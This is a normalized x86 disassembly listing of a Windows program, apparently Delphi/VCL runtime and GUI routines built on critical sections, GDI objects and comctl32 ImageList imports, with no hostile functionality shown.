mov esp ebp
pop ebp
retn
sub_41ef63
jmp sub_4038bc
sub_41efa5
jmp sub_4038bc
sub_41f004
jmp sub_4038bc
sub_41f00b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f270
mov dl 0x1
call sub_420aec
retn
sub_41f278
xor edx edx
call sub_420aec
retn
sub_41f371
jmp sub_4038bc
sub_41f547
jmp sub_4038bc
sub_41f54e
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f71c
jmp sub_4038bc
sub_41f723
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f7f9
jmp sub_4038bc
sub_41f800
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f917
jmp sub_4038bc
sub_41f91e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41fad8
jmp sub_4038bc
sub_41fadf
pop ecx
pop ebp
retn
sub_41fb6a
jmp sub_4038bc
sub_41fb71
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fbd8
jmp sub_4038bc
sub_41fbdf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fc5d
jmp sub_4038bc
sub_41fc64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc81
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41fc7a
jmp sub_4038bc
sub_41fc81
pop ebx
pop ecx
pop ebp
retn
sub_41fd3c
jmp sub_4038bc
sub_41fd43
pop ebx
pop ecx
pop ebp
retn
sub_41fe19
jmp sub_4038bc
sub_41fe20
pop ecx
pop ebp
retn
sub_41fe24
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41ff2b
jmp sub_4038bc
sub_41ff32
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4200d9
jmp sub_4038bc
sub_420158
jmp sub_4038bc
sub_42015f
mov esp ebp
pop ebp
retn
sub_42022d
jmp sub_4038bc
sub_420234
pop ebx
mov esp ebp
pop ebp
retn
sub_4202e7
jmp sub_4038bc
sub_4202ee
pop ebx
mov esp ebp
pop ebp
retn
sub_42034d
jmp sub_4038bc
sub_420354
mov esp ebp
pop ebp
retn
sub_4207b9
jmp sub_4038bc
sub_420813
jmp sub_4038bc
sub_420824
jmp sub_403608
sub_420880
jmp sub_4038bc
sub_420887
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4208e6
jmp sub_4038bc
sub_4208ed
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4208f4
mov edx rw-data
mov ecx 0x4
call sub_41e894
retn
sub_420a29
jmp sub_4038bc
sub_420a30
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420ade
jmp sub_4038bc
sub_420ae5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420b24
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cdc0
sub_420b58
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420b70
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420b7c
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420b70
sub_420ca2
jmp sub_403608
sub_420cd1
jmp sub_4038bc
sub_420d07
jmp sub_4038bc
sub_420d0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d2d
push rw-data
call LeaveCriticalSection
retn
sub_420d26
jmp sub_4038bc
sub_420d2d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420dfc
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_420fd8
sub_420e5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cf8c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_420e70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cf8c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420e84
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f1a4
retn
sub_420e90
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f1a4
retn
sub_421138
xor eax eax
retn
sub_42113c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421144
xor eax eax
retn
sub_421148
retn
sub_42114c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f0c
pop esi
pop ebx
retn
sub_421160
mov eax [ eax + 0x4 ]
retn
sub_421164
retn
sub_421168
xor eax eax
retn
sub_42116c
retn
sub_421170
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_42117c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_421188
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_421194
retn
sub_421198
xchg edx eax
call sub_41cc30
retn
sub_4211a0
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_421228
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403324
pop esi
retn
sub_42123c
retn
sub_42131c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f0c
pop esi
pop ebx
retn
sub_42135c
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4214a8
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_4214bc
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403370
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_4214d4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42155c
retn
sub_4215a4
retn
sub_4215dc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4215f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421818
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
sub_42163c
mov al 0x1
retn
sub_421640
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421648
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4216f0
xor eax eax
retn
sub_4216f4
retn
sub_421720
retn
sub_4217b8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4217cc
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4185a4
retn
sub_421913
jmp sub_403608
sub_421918
mov ebx 0x1
call sub_403970
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42197b
jmp sub_403608
sub_421980
mov ebx 0x80030103
call sub_403970
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4219fe
jmp sub_403608
sub_421a03
mov ebx 0x80030009
call sub_403970
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421a61
jmp sub_403608
sub_421a66
mov ebx 0x8000ffff
call sub_403970
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421c31
jmp sub_4038bc
sub_421c42
jmp sub_403608
sub_421c47
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c70
lea eax [ ebp + 0xc ]
call sub_4057b4
retn
sub_421c69
jmp sub_4038bc
sub_421c70
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_421c7c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421c88
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_421c94
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421ca0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_421d0f
jmp sub_403608
sub_421d14
mov esi 0x8000ffff
call sub_403970
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421d28
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_421d95
jmp sub_4038bc
sub_421d9c
mov eax [ rw-data ]
call sub_403128
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421dac
call sub_417ce8
retn
sub_421e74
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_422018
jmp sub_4038bc
sub_42201f
pop ebp
retn
sub_4220ad
jmp sub_4038bc
sub_4220b4
pop ebp
retn
sub_422435
jmp sub_4038bc
sub_42243c
pop ebp
retn
sub_422440
sub [ rw-data ] 0x1
retn
sub_422d1b
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_422fb1
add eax 0xffffffd8
jmp sub_4275e8
sub_422fb9
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_4234dc
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_423550
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4235c4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4235d0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4236b0
jmp sub_4038bc
sub_4236b7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423747
jmp sub_4038bc
sub_4237d9
jmp sub_4038bc
sub_4237e0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423844
jmp sub_4038bc
sub_42384b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4238b3
jmp sub_4038bc
sub_4238ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42395d
jmp sub_4038bc
sub_423964
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423dbc
push 0x33
mov ecx rw-data
call sub_418024
retn
sub_423dcc
push 0x33
mov ecx rw-data
call sub_417fe4
retn
sub_423ddc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423e00
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423fd4
push 0x11
mov ecx rw-data
call sub_417fe4
retn
sub_424114
push ebx
mov ebx eax
mov eax ebx
call sub_423ddc
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4241ce
jmp sub_4038bc
sub_4241d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_4241eb
jmp sub_4038bc
sub_424204
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424261
jmp sub_4038bc
sub_424268
pop ebx
pop ecx
pop ebp
retn
sub_4243e1
jmp sub_4038bc
sub_424409
jmp sub_4038bc
sub_424410
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_424594
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_4246b2
jmp sub_4038bc
sub_4246b9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_4246cf
jmp sub_4038bc
sub_424745
jmp sub_4038bc
sub_42474c
pop ebx
pop ecx
pop ebp
retn
sub_424750
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_424806
jmp sub_4038bc
sub_424818
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403324
sub_42482c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_42485c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_42496b
jmp sub_4038bc
sub_424972
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_424988
jmp sub_4038bc
sub_424a01
jmp sub_4038bc
sub_424a08
pop ebx
pop ecx
pop ebp
retn
sub_424b39
jmp sub_4038bc
sub_424b4c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424f1c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_425144
jmp sub_4038bc
sub_42514b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425154
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_42518c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_425198
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4252fc
retn
sub_4253c5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4253dc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4254c8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4254e8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425508
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425528
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
pop ebx
retn
sub_425540
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
pop ebx
retn
sub_425564
mov eax [ rw-data ]
call sub_425540
retn
sub_4255c6
jmp sub_4038bc
sub_4255cd
pop ecx
pop ebp
retn
sub_42566c
jmp sub_4038bc
sub_425673
pop ebx
mov esp ebp
pop ebp
retn
sub_425745
jmp sub_4038bc
sub_4257d6
jmp sub_4038bc
sub_4257dd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425808
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_4258ef
jmp sub_4038bc
sub_425a9c
jmp sub_4038bc
sub_425aa3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425cb5
jmp sub_4038bc
sub_425cbc
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_425d56
jmp sub_4038bc
sub_425f32
jmp sub_4038bc
sub_425fec
jmp sub_4038bc
sub_425ff3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426013
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42600c
jmp sub_4038bc
sub_426013
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4261a1
jmp sub_4038bc
sub_42636c
jmp sub_4038bc
sub_426373
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426396
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_42638f
jmp sub_4038bc
sub_426396
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263b6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_4263af
jmp sub_4038bc
sub_4263b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4263c0
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_426520
push 0x0
call sub_4264bc
retn
sub_4265c5
jmp sub_4038bc
sub_4265cc
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4265d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_426528
pop ebx
pop ebp
retn 0x4
sub_4265ec
retn
sub_4265f0
test eax eax
jne r-xdata
retn
call sub_4265ec
sub_4267c3
jmp sub_4038bc
sub_4267ea
jmp sub_4038bc
sub_4267f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426830
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_4269fd
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_426a06
jmp sub_4038bc
j_sub_4269fd
jmp sub_4269fd
sub_426a0d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_426a23
jmp sub_4038bc
sub_426a34
xor eax eax
retn
sub_426a38
mov al [ eax + 0x21 ]
retn
sub_426a84
jmp sub_4038bc
sub_426a8b
pop esi
pop ecx
pop ebp
retn
sub_426ab8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_426b0f
jmp sub_4038bc
sub_426b16
pop esi
pop ecx
pop ebp
retn
sub_426b1c
retn
sub_426b20
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426b30
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426cb5
jmp sub_4038bc
sub_426cbc
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_426ddb
jmp sub_4038bc
sub_426de2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426e73
jmp sub_4038bc
sub_426e7a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426f02
jmp sub_4038bc
sub_426f09
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427093
jmp sub_4038bc
sub_42709a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42720c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
sub_427250
jmp sub_403608
sub_427274
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426bd8
mov [ rw-data ] eax
sub_427294
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_427160
mov [ rw-data ] eax
sub_4273d4
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_427358
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42747c
jmp sub_403608
sub_42755f
jmp sub_403608
sub_4275c0
jmp sub_4038bc
sub_4275c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4275d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4273bc
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_4275e8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4273bc
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_427731
jmp sub_403608
sub_4277af
jmp sub_4038bc
sub_4277b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427950
retn
sub_427af0
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_427df4
jmp sub_4038bc
sub_427dfb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427f73
jmp sub_4038bc
sub_427f7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428009
jmp sub_4038bc
sub_428010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428032
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
sub_42802b
jmp sub_4038bc
sub_428032
pop ebx
mov esp ebp
pop ebp
retn
sub_428045
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_42832c
jmp r-xdata
retn
sub_42805b
call sub_4283b8
retn
sub_428150
retn
sub_4283a8
jmp sub_4038bc
sub_4284d3
jmp sub_4038bc
sub_4284da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_4284f3
jmp sub_4038bc
sub_4286ca
jmp sub_4038bc
sub_4286f2
jmp sub_4038bc
sub_4286f9
mov esp ebp
pop ebp
retn
sub_428770
jmp sub_4038bc
sub_428878
jmp sub_4038bc
sub_428963
jmp sub_4038bc
sub_428970
inc [ eax + 0x4 ]
retn
sub_428aeb
jmp sub_4038bc
sub_428e9c
jmp sub_4038bc
sub_4290e6
jmp sub_4038bc
sub_429110
jmp sub_4038bc
sub_429117
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429139
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_429132
jmp sub_4038bc
sub_429143
jmp sub_403608
sub_429192
jmp sub_4038bc
sub_4293bf
jmp sub_4038bc
sub_429407
jmp sub_4038bc
sub_429574
jmp sub_4038bc
sub_42963b
jmp sub_403608
sub_429690
mov [ eax + 0x31 ] 0x0
call sub_426830
retn
sub_4298e1
jmp sub_4038bc
sub_42994c
jmp sub_4038bc
sub_429953
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4299c4
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_429a78
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_429a88
push ebx
mov ebx eax
mov eax ebx
call sub_429d2c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_429a9c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_429ab8
push ebx
mov ebx eax
mov eax ebx
call sub_429d8c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_429c00
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_429d0f
jmp sub_4038bc
sub_429f40
jmp sub_4038bc
sub_429f47
pop ebx
pop ecx
pop ebp
retn
sub_429fd3
jmp sub_403608
sub_42a033
jmp sub_4038bc
sub_42a03a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42a41b
jmp sub_4038bc
sub_42a447
jmp sub_4038bc
sub_42a4ae
jmp sub_403608
sub_42a4df
jmp sub_4038bc
sub_42a564
jmp sub_403608
sub_42a569
mov eax [ ebp - 0x38 ]
call sub_403128
call sub_40391c
call sub_403970
sub_42a57b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a598
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_42a591
jmp sub_4038bc
sub_42a6e7
jmp sub_403608
sub_42a9b3
jmp sub_403608
sub_42ab3d
jmp sub_4038bc
sub_42abfc
mov cl 0x1
call sub_42ac04
retn
sub_42aeb9
add [ eax ] al
add [ ebx ] dh
leave
call sub_42ac04
retn
sub_42af3e
jmp sub_403608
sub_42af43
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_40391c
call sub_403970
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42af94
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42b0cd
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42b0fc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42b110
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42b229
jmp sub_403608
sub_42b2de
jmp sub_403608
sub_42b348
jmp sub_403608
sub_42b37c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42b308
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42b394
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425528
retn
mov [ eax + 0x30 ] edx
retn
sub_42b3ac
retn
sub_42b3b0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425528
retn
mov [ eax + 0x2c ] edx
retn
sub_42b3f0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425528
pop ebp
retn 0x4
sub_42b404
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425528
pop ebp
retn 0x4
sub_42b459
jmp sub_4038bc
sub_42b460
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b614
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42b620
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42b6cd
jmp sub_4038bc
sub_42b6d4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b7bf
jmp sub_403608
sub_42b82b
jmp sub_4038bc
sub_42b959
jmp sub_4038bc
sub_42b960
pop ebp
retn
sub_42ba95
jmp sub_4038bc
sub_42ba9c
pop ebp
retn
sub_42baa0
sub [ rw-data ] 0x1
retn
sub_42bcf0
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418700
retn
sub_42bd24
mov eax [ eax + 0x4 ]
call sub_4185a4
retn
sub_42bd55
jmp sub_4038bc
sub_42bd5c
pop ebp
retn
sub_42bd60
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ __import_lookup_table_13(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
